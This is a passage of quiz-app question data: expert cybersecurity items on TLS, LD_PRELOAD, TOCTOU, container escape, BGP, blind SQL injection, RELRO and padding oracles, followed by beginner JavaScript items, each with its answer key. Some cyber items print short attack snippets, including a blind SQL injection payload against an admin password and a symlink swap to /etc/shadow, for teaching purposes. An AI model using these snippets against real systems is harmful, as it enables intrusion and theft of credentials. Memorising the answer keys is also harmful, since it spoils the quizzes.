    correctAnswer: "To enforce Perfect Forward Secrecy (PFS), guaranteeing past recorded session traffic cannot be decrypted even if the server's private key is compromised later",
    acceptedAnswers: ["To enforce Perfect Forward Secrecy (PFS), guaranteeing past recorded session traffic cannot be decrypted even if the server's private key is compromised later"],
    hint: "In static RSA, an attacker who records encrypted traffic can decrypt everything if they steal the private key years later.",
    explanation: "With static RSA, if the server's private key is ever stolen, all historical recorded sessions can be decrypted. Ephemeral Diffie-Hellman (ECDHE) generates unique session keys for every connection, guaranteeing Perfect Forward Secrecy (PFS).",
    points: 300,
    estimatedSeconds: 30,
    tags: ["tls13", "pfs", "cryptography"]
  },
  {
    id: "cyber-exp-012",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "linux_security",
    subtopic: "ld_preload",
    standardVersion: "glibc Dynamic Linker",
    prompt: "How does the `LD_PRELOAD` environment variable allow intercepting C library calls in dynamically linked Linux binaries?",
    code: "$ export LD_PRELOAD=/tmp/hook.so\n$ ./victim_application",
    options: [
      "The dynamic linker (`ld.so`) loads the specified shared object before all other libraries, allowing custom symbols to override standard libc functions",
      "It re-compiles the victim binary using GCC optimization flags",
      "It injects an interrupt handler into the Linux kernel IDT table",
      "It modifies the executable ELF header permissions on disk"
    ],
    correctAnswer: "The dynamic linker (`ld.so`) loads the specified shared object before all other libraries, allowing custom symbols to override standard libc functions",
    acceptedAnswers: ["The dynamic linker (`ld.so`) loads the specified shared object before all other libraries, allowing custom symbols to override standard libc functions"],
    hint: "The dynamic linker resolves symbols in the order libraries are loaded. Preloaded libraries take priority.",
    explanation: "`LD_PRELOAD` instructs `ld.so` to load specified shared objects first. If the preloaded library exports a function like `getuid()` or `open()`, its definition overrides `libc`'s definition for that process (disabled by the dynamic linker on SUID binaries for security).",
    points: 300,
    estimatedSeconds: 30,
    tags: ["linux", "ld_preload", "shared_libraries"]
  },
  {
    id: "cyber-exp-013",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "concurrency_security",
    subtopic: "toctou_race",
    standardVersion: "CWE-367",
    prompt: "What characterizes a Time-of-Check to Time-of-Use (TOCTOU) file race condition?",
    code: "if (access(\"/tmp/file\", W_OK) == 0) { // Time of check\n    // ATTACKER SWAPS /tmp/file TO SYMLINK -> /etc/shadow HERE\n    int fd = open(\"/tmp/file\", O_WRONLY); // Time of use\n}",
    options: [
      "The state of a resource changes between the moment permission is verified and the moment the resource is accessed, invalidating the authorization check",
      "A thread acquires two locks in reverse order, producing a deadlock",
      "A database transaction commits before checking primary key uniqueness",
      "A cryptographic nonce is reused across multiple initialization vectors"
    ],
    correctAnswer: "The state of a resource changes between the moment permission is verified and the moment the resource is accessed, invalidating the authorization check",
    acceptedAnswers: ["The state of a resource changes between the moment permission is verified and the moment the resource is accessed, invalidating the authorization check"],
    hint: "Between `access()` and `open()`, an attacker swaps the file for a symlink to a sensitive target.",
    explanation: "TOCTOU occurs when a program checks a condition (e.g. `access()` verifying non-root ownership) and then acts on it (`open()`) non-atomically. In the window between check and use, an attacker replaces the file with a symlink to `/etc/shadow`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["toctou", "race_condition", "cwe-367"]
  },
  {
    id: "cyber-exp-014",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "cryptography",
    subtopic: "timing_attack",
    standardVersion: "Side-Channel Security",
    prompt: "Why is comparing cryptographic tokens using standard string equality `token1 == token2` vulnerable to timing attacks?",
    code: "// Vulnerable comparison\nfunction verify(userToken, secretToken) {\n  return userToken === secretToken; // Byte-by-byte early return!\n}",
    options: [
      "Standard string comparison terminates early on the first mismatched byte, allowing an attacker to deduce the token byte-by-byte by measuring response latencies",
      "String equality automatically logs both tokens to the browser console",
      "The operator causes an integer overflow when strings exceed 32 characters",
      "JavaScript V8 optimizes string equality by transmitting both values to a remote thread"
    ],
    correctAnswer: "Standard string comparison terminates early on the first mismatched byte, allowing an attacker to deduce the token byte-by-byte by measuring response latencies",
    acceptedAnswers: ["Standard string comparison terminates early on the first mismatched byte, allowing an attacker to deduce the token byte-by-byte by measuring response latencies"],
    hint: "If the first byte matches, comparison takes slightly longer than if it fails immediately. Constant-time comparison (`crypto.timingSafeEqual`) is required.",
    explanation: "Standard string comparison returns `false` as soon as a mismatch occurs. By measuring network/execution response latency with high precision, an attacker can determine which character caused the comparison to run longer, extracting secrets byte-by-byte.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["timing_attack", "side_channel", "crypto"]
  },
  {
    id: "cyber-exp-015",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "linux_security",
    subtopic: "container_escape",
    standardVersion: "Linux Namespaces / OCI",
    prompt: "How can a process escape a Docker container started with `--privileged` flag?",
    code: "# docker run --privileged -it ubuntu bash\nroot@container:/# ls /dev/sda1\nroot@container:/# mount /dev/sda1 /mnt/host_root",
    options: [
      "The container has full access to the host `/dev` devices and can mount the host root filesystem (`/dev/sda1`) to access host files",
      "The container kernel runs a separate microcode emulator that crashes",
      "The Docker daemon transmits root passwords over open UDP broadcast",
      "The container can modify the host BIOS through CPU microcode"
    ],
    correctAnswer: "The container has full access to the host `/dev` devices and can mount the host root filesystem (`/dev/sda1`) to access host files",
    acceptedAnswers: ["The container has full access to the host `/dev` devices and can mount the host root filesystem (`/dev/sda1`) to access host files"],
    hint: "The `--privileged` flag disables AppArmor/seccomp and exposes all host block devices in `/dev`.",
    explanation: "Running a container with `--privileged` disables seccomp/AppArmor and grants all Linux capabilities, exposing host hardware block devices (`/dev/sda*`). The container root can simply mount the host drive and edit the host's `/etc/shadow` or `/etc/cron*`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["containers", "docker", "privilege_escalation"]
  },
  {
    id: "cyber-exp-016",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "networking",
    subtopic: "bgp_hijacking",
    standardVersion: "RFC 4271",
    prompt: "What architectural lack of authentication in the Border Gateway Protocol (BGP) enables BGP Hijacking?",
    code: "// BGP Routing Table\nAttacker Autonomous System (AS) broadcasts fake BGP route claiming shortest path to 192.0.2.0/24",
    options: [
      "BGP historically trusts routing announcements between Autonomous Systems (AS) without cryptographically verifying origin authorization (RPKI)",
      "BGP packets are uncompressed and can be decoded by Wireshark",
      "BGP operates exclusively over unencrypted HTTP GET requests",
      "BGP routers discard sequence numbers when packets traverse ocean cables"
    ],
    correctAnswer: "BGP historically trusts routing announcements between Autonomous Systems (AS) without cryptographically verifying origin authorization (RPKI)",
    acceptedAnswers: ["BGP historically trusts routing announcements between Autonomous Systems (AS) without cryptographically verifying origin authorization (RPKI)"],
    hint: "BGP assumes peer routers are telling the truth when they advertise ownership of IP address blocks. RPKI was developed to fix this.",
    explanation: "BGP was designed without cryptographic origin validation. Any autonomous system can advertise ownership of an IP prefix (especially more specific `/24` subnets). Traffic across the internet is rerouted to the rogue AS unless RPKI Route Origin Authorization is enforced.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["bgp", "networking", "routing"]
  },
  {
    id: "cyber-exp-017",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "web_security",
    subtopic: "blind_sqli",
    standardVersion: "OWASP Top 10",
    prompt: "In a Time-Based Blind SQL Injection, how does the attacker infer whether a condition (such as the first character of a password) is correct?",
    code: "' OR (SELECT IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) FROM users WHERE user='admin')-- -",
    options: [
      "By measuring whether the HTTP server response is delayed by 5 seconds (confirming the true branch executed)",
      "By examining the MySQL error code printed on the webpage",
      "By looking at the HTML source code comments for database logs",
      "By monitoring the database port for outbound DNS packets"
    ],
    correctAnswer: "By measuring whether the HTTP server response is delayed by 5 seconds (confirming the true branch executed)",
    acceptedAnswers: ["By measuring whether the HTTP server response is delayed by 5 seconds (confirming the true branch executed)"],
    hint: "When errors and output are suppressed, the attacker uses `SLEEP()` to communicate information through time delays.",
    explanation: "When an application does not reflect database content or errors, the attacker injects a conditional delay (`SLEEP(5)` or `pg_sleep(5)`). If the condition is true, the response takes 5+ seconds; if false, it returns immediately. This extracts data bit-by-bit.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["sqli", "blind_sqli", "time_based"]
  },
  {
    id: "cyber-exp-018",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "binary_exploitation",
    subtopic: "got_overwrite",
    standardVersion: "ELF Dynamic Linking",
    prompt: "How does Partial RELRO (Relocation Read-Only) leave an ELF binary vulnerable to Global Offset Table (GOT) overwrites?",
    code: "// ELF Binary Relocations\nPartial RELRO: .got section remains Writable after load\nFull RELRO: .got is marked Read-Only after resolution",
    options: [
      "In Partial RELRO, the `.got.plt` section remains writable so dynamic functions can be lazily bound, allowing an attacker with arbitrary write to hijack library function pointers",
      "Partial RELRO automatically decrypts all binary functions into memory",
      "It disables ASLR for the main executable stack",
      "It causes the ELF dynamic linker to delete the symbol table"
    ],
    correctAnswer: "In Partial RELRO, the `.got.plt` section remains writable so dynamic functions can be lazily bound, allowing an attacker with arbitrary write to hijack library function pointers",
    acceptedAnswers: ["In Partial RELRO, the `.got.plt` section remains writable so dynamic functions can be lazily bound, allowing an attacker with arbitrary write to hijack library function pointers"],
    hint: "Full RELRO resolves all symbols at startup and marks `.got` read-only. Partial RELRO keeps `.got.plt` writable.",
    explanation: "Under Partial RELRO, dynamic symbols are resolved lazily on first call, meaning `.got.plt` must remain writable. An attacker with an arbitrary memory write vulnerability can overwrite `puts@got` with `system`, redirecting calls.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["relro", "got", "binary_exploitation"]
  },
  {
    id: "cyber-exp-019",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "cryptography",
    subtopic: "aes_ebc_mode",
    standardVersion: "NIST SP 800-38A",
    prompt: "Why is AES in Electronic Codebook (ECB) mode considered cryptographically insecure for data larger than one block?",
    code: "// AES-ECB Encryption\nBlock 1: Plaintext_A -> Ciphertext_X\nBlock 2: Plaintext_A -> Ciphertext_X (Identical output!)",
    options: [
      "Identical plaintext blocks always produce identical ciphertext blocks, preserving data patterns (e.g. the ECB Penguin)",
      "ECB mode only supports 64-bit encryption keys",
      "ECB mode requires the private key to be shared publicly in the HTTP header",
      "It uses non-deterministic random numbers that cannot be verified"
    ],
    correctAnswer: "Identical plaintext blocks always produce identical ciphertext blocks, preserving data patterns (e.g. the ECB Penguin)",
    acceptedAnswers: ["Identical plaintext blocks always produce identical ciphertext blocks, preserving data patterns (e.g. the ECB Penguin)"],
    hint: "Because each 16-byte block is encrypted independently without an Initialization Vector (IV), structural patterns leak directly through the ciphertext.",
    explanation: "In ECB mode, each block is encrypted independently with no initialization vector or chaining. Identical 16-byte plaintext blocks yield identical ciphertext blocks, leaking structural patterns (famously demonstrated by encrypting a bitmap image of Tux the penguin).",
    points: 300,
    estimatedSeconds: 30,
    tags: ["crypto", "aes", "ecb_mode"]
  },
  {
    id: "cyber-exp-020",
    language: "cyber",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "cryptography",
    subtopic: "padding_oracle",
    standardVersion: "CWE-388 / CBC Mode",
    prompt: "How does a CBC Padding Oracle attack decrypt ciphertext without knowing the secret key?",
    code: "// Padding Oracle\nServer response reveals whether PKCS#7 padding was valid or invalid after decryption",
    options: [
      "By flipping ciphertext bits and observing whether the server returns a padding error, the attacker reconstructs intermediate state bytes and recovers the plaintext byte-by-byte",
      "By factoring the RSA modulus using quantum Shor's algorithm",
      "By intercepting the private key transmitted during the TLS handshake",
      "By overflowing the AES block cipher internal S-box memory cache"
    ],
    correctAnswer: "By flipping ciphertext bits and observing whether the server returns a padding error, the attacker reconstructs intermediate state bytes and recovers the plaintext byte-by-byte",
    acceptedAnswers: ["By flipping ciphertext bits and observing whether the server returns a padding error, the attacker reconstructs intermediate state bytes and recovers the plaintext byte-by-byte"],
    hint: "A server distinguishing between 'invalid padding' and 'invalid data' acts as an oracle that reveals the underlying decryption math.",
    explanation: "In CBC mode, plaintext $P_i = D_K(C_i) \oplus C_{i-1}$. If a server reveals whether PKCS#7 padding was valid (via HTTP 500 vs 200 or response timing), an attacker manipulates $C_{i-1}$ bytes to find the single value producing valid padding, decrypting the entire ciphertext.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["padding_oracle", "crypto", "cbc_mode"]
  }
];

/* --- End of data/cyber-questions.js --- */

/* --- Start of data/javascript-questions.js --- */
/**
 * SyntaxArena Question Bank — JavaScript (ES2024 / Node.js / Web APIs)
 * Exactly 60 curated challenges: 20 Beginner, 20 Intermediate, 20 Expert.
 * Standard: ECMAScript 2024
 * Source of truth: docs/QUESTION_SCHEMA.md
 */

var javascriptQuestions = window.javascriptQuestions = [
  // =========================================================================
  // JAVASCRIPT BEGINNER (20 QUESTIONS: js-beg-001 to js-beg-020)
  // =========================================================================
  {
    id: "js-beg-001",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "data_types",
    subtopic: "typeof_quirks",
    standardVersion: "ECMAScript 2024",
    prompt: "What is the exact stdout printed after evaluating typeof null and typeof undefined in JavaScript?",
    code: "console.log(typeof null, typeof undefined);",
    options: ["object undefined", "null undefined", "object object", "undefined undefined"],
    correctAnswer: "object undefined",
    acceptedAnswers: ["object undefined"],
    hint: "`typeof null` returning 'object' is an infamous historical quirk dating back to the very first release of JavaScript.",
    explanation: "In JavaScript's initial implementation, values were represented with a type tag and a value. Objects had tag 0, and `null` was represented as NULL pointer (0x00), causing `typeof null` to erroneously return `'object'`. `typeof undefined` correctly returns `'undefined'`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["javascript", "types", "typeof"]
  },
  {
    id: "js-beg-002",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "type_coercion",
    subtopic: "loose_vs_strict_equality",
    standardVersion: "ECMAScript 2024",
    prompt: "What does this equality check snippet print to the console?",
    code: "console.log(0 == false, 0 === false, '' == false);",
    options: ["true false true", "true true true", "false false false", "true false false"],
    correctAnswer: "true false true",
    acceptedAnswers: ["true false true"],
    hint: "Loose equality `==` coerces operands to numbers (0 and false both become 0, '' becomes 0). Strict equality `===` checks both type and value.",
    explanation: "Loose equality `==` uses the Abstract Equality Comparison Algorithm. `false` converts to `0`, so `0 == 0` is true. `''` converts to `0`, so `0 == 0` is true. But strict equality `===` checks types without coercion: `number !== boolean`, so `0 === false` is false.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["coercion", "equality", "javascript"]
  },
  {
    id: "js-beg-003",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "type_coercion",
    subtopic: "string_plus_number",
    standardVersion: "ECMAScript 2024",
    prompt: "What is the exact output of evaluating the `+` and `-` operators between numbers and string numbers?",
    code: "const a = 1 + '2';\nconst b = '5' - 2;\nconsole.log(a, typeof a, b, typeof b);",
    options: [
      "12 string 3 number",
      "3 number 3 number",
      "12 string NaN number",
      "3 string 3 number"
    ],
    correctAnswer: "12 string 3 number",
    acceptedAnswers: ["12 string 3 number"],
    hint: "The `+` operator acts as string concatenation if either operand is a string. The `-` operator only performs numeric subtraction.",
    explanation: "When either operand to `+` is a string, JavaScript coerces the other operand to a string, resulting in `'12'`. However, `-` has no string operation, so `'5'` is converted to the number `5`, producing numeric `3`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["coercion", "operators", "javascript"]
  },
  {
    id: "js-beg-004",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "arrays",
    subtopic: "map_immutability",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed by this Array.prototype.map operation?",
    code: "const arr = [1, 2, 3];\nconst mapped = arr.map(x => x * 2);\nconsole.log(arr.length, mapped[1]);",
    options: ["3 4", "3 2", "6 4", "undefined 4"],
    correctAnswer: "3 4",
    acceptedAnswers: ["3 4"],
    hint: "Array `.map()` does not mutate the original array; it returns a new array with the transformed elements.",
    explanation: "`Array.prototype.map()` creates and returns a fresh array populated with the results of calling the provided function on every element. `arr` remains untouched (`length = 3`), and `mapped[1]` is `2 * 2 = 4`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["arrays", "map", "functional"]
  },
  {
    id: "js-beg-005",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "data_types",
    subtopic: "nan_comparison",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed when comparing NaN to itself?",
    code: "const val = NaN;\nconsole.log(val === val, Object.is(val, val));",
    options: ["false true", "false false", "true true", "true false"],
    correctAnswer: "false true",
    acceptedAnswers: ["false true"],
    hint: "Under IEEE 754 floating point rules, NaN is never equal to any value, including itself. `Object.is()` uses SameValue algorithm.",
    explanation: "According to the IEEE 754 standard and JavaScript specification, `NaN === NaN` always evaluates to `false`. However, ES6's `Object.is(NaN, NaN)` implements SameValue equivalence and evaluates to `true`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["nan", "equality", "ieee754"]
  },
  {
    id: "js-beg-006",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "variables",
    subtopic: "const_object_mutability",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed after mutating a property on a `const` object declaration?",
    code: "const hero = { name: 'MatrixCat', score: 100 };\nhero.score = 250;\nconsole.log(hero.score);",
    options: ["250", "100", "TypeError: Assignment to constant variable", "undefined"],
    correctAnswer: "250",
    acceptedAnswers: ["250"],
    hint: "`const` prevents reassigning the variable identifier to another object, but does NOT make the object's properties immutable.",
    explanation: "Declaring an object with `const` binds the variable identifier to that memory reference permanently. However, the properties of the underlying object remain fully mutable. Mutating `hero.score` succeeds and prints `250`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["const", "mutability", "objects"]
  },
  {
    id: "js-beg-007",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "operators",
    subtopic: "nullish_coalescing",
    standardVersion: "ECMAScript 2024",
    prompt: "What is the difference in output between logical OR `||` and nullish coalescing `??` for zero and empty string?",
    code: "const count = 0;\nconst title = '';\nconsole.log(count || 10, count ?? 10, title ?? 'Default');",
    options: ["10 0 ''", "0 0 'Default'", "10 10 'Default'", "0 10 ''"],
    correctAnswer: "10 0 ''",
    acceptedAnswers: ["10 0 ''"],
    hint: "Logical OR `||` checks for any falsy value (0, '', false, NaN, null, undefined). `??` only checks strictly for null or undefined.",
    explanation: "`count || 10` treats `0` as falsy and returns `10`. But nullish coalescing `??` only triggers if the left operand is `null` or `undefined`. Because `0` and `''` are neither null nor undefined, `count ?? 10` is `0`, and `title ?? 'Default'` is `''`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["operators", "nullish_coalescing"]
  },
  {
    id: "js-beg-008",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "functions",
    subtopic: "arrow_function_this",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed by invoking an arrow function defined as an object method?",
    code: "const obj = {\n  val: 42,\n  getVal: () => this.val\n};\nconsole.log(obj.getVal());",
    options: ["undefined", "42", "TypeError: this is not defined", "NaN"],
    correctAnswer: "undefined",
    acceptedAnswers: ["undefined"],
    hint: "Arrow functions do not bind their own `this`; they inherit `this` lexically from the enclosing scope (which here is the global/module scope).",
    explanation: "Arrow functions lack their own `this` binding. Instead, `this` is lexically resolved to the enclosing outer scope (in Node/module, that is `exports` or `window` in browser). Since `val` is not on the global object, `this.val` evaluates to `undefined`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["arrow_functions", "this", "scoping"]
  },
  {
    id: "js-beg-009",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "objects",
    subtopic: "optional_chaining",
    standardVersion: "ECMAScript 2024",
    prompt: "What does accessing an undefined nested property via optional chaining `?.` return?",
    code: "const user = { profile: { callsign: 'Fox' } };\nconsole.log(user.profile?.callsign, user.stats?.streak);",
    options: ["Fox undefined", "Fox null", "Fox TypeError: Cannot read property", "undefined undefined"],
    correctAnswer: "Fox undefined",
    acceptedAnswers: ["Fox undefined"],
    hint: "Optional chaining `?.` short-circuits to `undefined` without throwing a TypeError when encountering null or undefined.",
    explanation: "Optional chaining `?.` evaluates the expression before the question mark. If it is `null` or `undefined`, evaluation short-circuits and safely returns `undefined` instead of throwing a `TypeError: Cannot read properties of undefined`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["optional_chaining", "objects", "safety"]
  },
  {
    id: "js-beg-010",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "variables",
    subtopic: "hoisting_tdz",
    standardVersion: "ECMAScript 2024",
    prompt: "What happens when logging `a` declared with `var` versus `b` declared with `let` before their initializations?",
    code: "console.log(a);\nvar a = 10;\nconsole.log(b);\nlet b = 20;",
    options: [
      "Logs undefined, then throws ReferenceError for b",
      "Throws ReferenceError for a immediately",
      "Logs undefined, then logs undefined",
      "Logs 10, then logs 20"
    ],
    correctAnswer: "Logs undefined, then throws ReferenceError for b",
    acceptedAnswers: ["Logs undefined, then throws ReferenceError for b"],
    hint: "`var` is hoisted and initialized to `undefined`. `let` is hoisted into the Temporal Dead Zone (TDZ) and cannot be accessed before declaration.",
    explanation: "`var a` is hoisted and initialized to `undefined`, so `console.log(a)` successfully prints `undefined`. `let b` is hoisted into a Temporal Dead Zone (TDZ) where accessing it before its lexical declaration throws a `ReferenceError: Cannot access 'b' before initialization`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["hoisting", "tdz", "let_var"]
  },
  {
    id: "js-beg-011",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "arrays",
    subtopic: "destructuring_defaults",
    standardVersion: "ECMAScript 2024",
    prompt: "What are the values of x and y after array destructuring with default parameters?",
    code: "const [x = 1, y = 2] = [10, undefined];\nconsole.log(x, y);",
    options: ["10 2", "10 undefined", "1 2", "10 null"],
    correctAnswer: "10 2",
    acceptedAnswers: ["10 2"],
    hint: "Default values in destructuring are only triggered when the corresponding value is strictly `undefined`.",
    explanation: "In destructuring, default values are applied when the incoming element is `undefined`. `x` receives `10`. The second element is explicitly `undefined`, which triggers the fallback default `y = 2`. Thus `10 2` is printed.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["destructuring", "defaults", "arrays"]
  },
  {
    id: "js-beg-012",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "collections",
    subtopic: "set_uniqueness",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed by checking the size of a Set initialized with primitive and object duplicates?",
    code: "const s = new Set([1, 1, '1', {}, {}]);\nconsole.log(s.size);",
    options: ["4", "3", "5", "2"],
    correctAnswer: "4",
    acceptedAnswers: ["4"],
    hint: "Primitives are compared by value, so `1` is deduplicated, while `'1'` is distinct. Distinct object literals `{}` hold unique memory references.",
    explanation: "The Set stores `1` (the duplicate `1` is ignored) and `'1'` (a string, not coerced). The two `{}` object literals create two distinct object instances in memory with different references. Hence, the Set has 4 elements: `1`, `'1'`, and two separate `{}` objects.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["set", "collections", "equality"]
  },
  {
    id: "js-beg-013",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "arrays",
    subtopic: "slice_vs_splice",
    standardVersion: "ECMAScript 2024",
    prompt: "What is the difference in behavior between Array.prototype.slice and Array.prototype.splice?",
    code: "const items = ['a', 'b', 'c', 'd'];\nconst sub = items.slice(1, 3);\nitems.splice(1, 2);\nconsole.log(sub.length, items.length);",
    options: ["2 2", "2 4", "3 2", "2 1"],
    correctAnswer: "2 2",
    acceptedAnswers: ["2 2"],
    hint: "`slice` copies elements into a new array without mutating. `splice` directly removes/inserts elements in the original array.",
    explanation: "`slice(1, 3)` extracts index 1 and 2 (`['b', 'c']`), creating a new array of length 2 without mutating `items`. Then `items.splice(1, 2)` removes 2 elements starting at index 1 from `items` in-place, leaving `items` with `['a', 'd']` (length 2). Both lengths are 2.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["arrays", "slice", "splice"]
  },
  {
    id: "js-beg-014",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "json",
    subtopic: "stringify_omissions",
    standardVersion: "ECMAScript 2024",
    prompt: "What does JSON.stringify do with properties whose values are functions, symbols, or undefined?",
    code: "const data = { a: 1, b: undefined, c: () => {}, d: Symbol('id') };\nconsole.log(JSON.stringify(data));",
    options: ["{\"a\":1}", "{\"a\":1,\"b\":null,\"c\":null,\"d\":null}", "{\"a\":1,\"b\":undefined}", "TypeError: Cannot stringify Symbol"],
    correctAnswer: "{\"a\":1}",
    acceptedAnswers: ["{\"a\":1}"],
    hint: "Properties with values `undefined`, functions, or symbols are omitted completely during JSON serialization of objects.",
    explanation: "According to the JSON specification, functions, undefined, and symbols are not valid JSON data types. When serializing an object, `JSON.stringify()` silently omits these properties. Thus, only `{\"a\":1}` is produced.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["json", "serialization"]
  },
  {
    id: "js-beg-015",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "arrays",
    subtopic: "spread_shallow_copy",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed when mutating a nested object after creating a shallow copy using the spread operator?",
    code: "const original = [{ val: 10 }];\nconst copy = [...original];\ncopy[0].val = 99;\nconsole.log(original[0].val);",
    options: ["99", "10", "undefined", "TypeError: Cannot assign to read only"],
    correctAnswer: "99",
    acceptedAnswers: ["99"],
    hint: "The spread operator `...` creates a shallow clone: only the top-level array is cloned; inner object references remain shared.",
    explanation: "The spread operator performs a shallow copy. The outer array is a new array, but its elements are object references pointing to the exact same `{ val: 10 }` object in memory. Mutating `copy[0].val` mutates the shared object, so `original[0].val` is `99`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["spread", "shallow_copy", "references"]
  },
  {
    id: "js-beg-016",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "arrays",
    subtopic: "reduce_accumulator",
    standardVersion: "ECMAScript 2024",
    prompt: "What is the result of using Array.prototype.reduce to sum numbers with an initial accumulator value of 10?",
    code: "const nums = [1, 2, 3, 4];\nconst sum = nums.reduce((acc, curr) => acc + curr, 10);\nconsole.log(sum);",
    options: ["20", "10", "15", "24"],
    correctAnswer: "20",
    acceptedAnswers: ["20"],
    hint: "The accumulator begins at 10. Then 1, 2, 3, and 4 are added sequentially: 10 + 1 + 2 + 3 + 4 = 20.",
    explanation: "`Array.prototype.reduce` initializes `acc` with the provided initial value `10`. Each iteration adds the current element: 10 + 1 = 11, 11 + 2 = 13, 13 + 3 = 16, 16 + 4 = 20. The final result is 20.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["arrays", "reduce", "functional"]
  },
  {
    id: "js-beg-017",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "data_types",
    subtopic: "truthy_falsy",
    standardVersion: "ECMAScript 2024",
    prompt: "Which value among `[]`, `{}`, `\"\"`, and `0` evaluates to falsy in JavaScript?",
    code: "console.log(Boolean([]), Boolean({}), Boolean(''), Boolean(0));",
    options: ["true true false false", "false false false false", "true false false false", "true true true false"],
    correctAnswer: "true true false false",
    acceptedAnswers: ["true true false false"],
    hint: "All objects (including empty arrays `[]` and empty objects `{}`) are truthy. Only 8 values are falsy in JS: false, 0, -0, 0n, '', null, undefined, NaN.",
    explanation: "In JavaScript, all objects and arrays are truthy, even if empty (`Boolean([]) === true` and `Boolean({}) === true`). Only empty strings `''`, `0`, `null`, `undefined`, `NaN`, and `false` evaluate to `false`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["boolean", "truthy_falsy"]
  },
  {
    id: "js-beg-018",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "strings",
    subtopic: "template_literals",
    standardVersion: "ECMAScript 2024",
    prompt: "What does this template literal expression output?",
    code: "const a = 5, b = 10;\nconsole.log(`Sum: ${a + b}, Mult: ${a * b}`);",
    options: ["Sum: 15, Mult: 50", "Sum: 510, Mult: 50", "Sum: ${a+b}, Mult: ${a*b}", "Sum: 15, Mult: 10"],
    correctAnswer: "Sum: 15, Mult: 50",
    acceptedAnswers: ["Sum: 15, Mult: 50"],
    hint: "Expressions inside `${...}` in backtick template literals are evaluated dynamically at runtime.",
    explanation: "Template literals enclosed in backticks evaluate expressions inside `${...}`. `5 + 10` evaluates to 15, and `5 * 10` evaluates to 50, printing `Sum: 15, Mult: 50`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["strings", "template_literals"]
  },
  {
    id: "js-beg-019",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "arrays",
    subtopic: "indexof_missing",
    standardVersion: "ECMAScript 2024",
    prompt: "What is returned by `indexOf` when an element is not present in the array?",
    code: "const list = ['python', 'c', 'cpp'];\nconsole.log(list.indexOf('java'), list.includes('java'));",
    options: ["-1 false", "null false", "undefined false", "0 false"],
    correctAnswer: "-1 false",
    acceptedAnswers: ["-1 false"],
    hint: "`indexOf()` returns `-1` if the element cannot be found. `.includes()` returns a boolean (`false`).",
    explanation: "By convention, `Array.prototype.indexOf()` returns `-1` when the target element is not found within the array. `Array.prototype.includes()` returns boolean `false`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["arrays", "indexof", "includes"]
  },
  {
    id: "js-beg-020",
    language: "javascript",
    difficulty: "beginner",
    type: "predict_output",
    topic: "numbers",
    subtopic: "parseint_radix",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed by parseInt('10', 2) versus parseInt('10', 10)?",
    code: "console.log(parseInt('10', 2), parseInt('10', 10));",
    options: ["2 10", "10 10", "2 2", "NaN 10"],
    correctAnswer: "2 10",
    acceptedAnswers: ["2 10"],
    hint: "The second argument to `parseInt()` specifies the radix (base): base 2 is binary.",
